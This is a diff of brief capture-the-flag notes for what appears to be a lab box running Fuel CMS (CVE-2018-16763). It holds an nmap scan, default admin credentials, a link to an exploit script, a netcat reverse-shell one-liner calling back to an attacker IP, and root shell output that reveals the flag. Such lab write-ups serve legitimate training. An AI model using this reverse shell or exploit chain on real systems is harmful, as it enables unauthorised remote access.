@@ -1,5 +1,6 @@
 **Tristan Gomez**
 
+ CVE-2018-16763
 nmap
 ```
 └─$ sudo nmap -Pn 10.10.202.5
@@ -18,8 +19,7 @@ Nmap done: 1 IP address (1 host up) scanned in 49.31 seconds
 `admin:admin`
 `https://github.com/AssassinUKG/fuleCMS/blob/main/fuelCMS.py`
 
-`"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.248.108 1111 >/tmp/f"`
-
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.248.108 1111 >/tmp/f`
 
 ```
 $db['default'] = array(
@@ -44,4 +44,13 @@ $db['default'] = array(
         'save_queries' => TRUE
 );
 
+```
+
+```
+root@ubuntu:/var/www/html# whoami
+root
+root@ubuntu:/var/www/html# cat /root/root.txt
+cat /root/root.txt
+b9bbcb33e11b80be759c4e844862482d 
+root@ubuntu:/var/www/html# 
 ```
